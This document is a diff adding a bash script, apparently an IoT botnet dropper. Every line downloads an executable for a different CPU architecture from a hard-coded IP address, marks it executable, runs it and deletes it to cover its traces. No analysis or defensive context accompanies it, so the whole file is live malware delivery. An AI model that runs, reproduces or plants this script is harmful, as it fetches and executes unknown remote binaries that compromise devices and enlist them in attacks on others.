@@ -1,0 +1,15 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://159.89.239.212/garcia.mips; chmod +x garcia.mips; ./garcia.mips; rm -rf garcia.mips
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://159.89.239.212/garcia.mpsl; chmod +x garcia.mpsl; ./garcia.mpsl; rm -rf garcia.mpsl
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://159.89.239.212/garcia.sh4; chmod +x garcia.sh4; ./garcia.sh4; rm -rf garcia.sh4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://159.89.239.212/garcia.x86; chmod +x garcia.x86; ./garcia.x86; rm -rf garcia.x86
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://159.89.239.212/garcia.arm6; chmod +x garcia.arm6; ./garcia.arm6; rm -rf garcia.arm6
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://159.89.239.212/garcia.i686; chmod +x garcia.i686; ./garcia.i686; rm -rf garcia.i686
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://159.89.239.212/garcia.ppc; chmod +x garcia.ppc; ./garcia.ppc; rm -rf garcia.ppc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://159.89.239.212/garcia.i586; chmod +x garcia.i586; ./garcia.i586; rm -rf garcia.i586
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://159.89.239.212/garcia.m68k; chmod +x garcia.m68k; ./garcia.m68k; rm -rf garcia.m68k
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://159.89.239.212/garcia.sparc; chmod +x garcia.sparc; ./garcia.sparc; rm -rf garcia.sparc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://159.89.239.212/garcia.arm4; chmod +x garcia.arm4; ./garcia.arm4; rm -rf garcia.arm4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://159.89.239.212/garcia.arm5; chmod +x garcia.arm5; ./garcia.arm5; rm -rf garcia.arm5
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://159.89.239.212/garcia.arm7; chmod +x garcia.arm7; ./garcia.arm7; rm -rf garcia.arm7
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://159.89.239.212/garcia.ppc440fp; chmod +x garcia.ppc440fp; ./garcia.ppc440fp; rm -rf garcia.ppc440fp
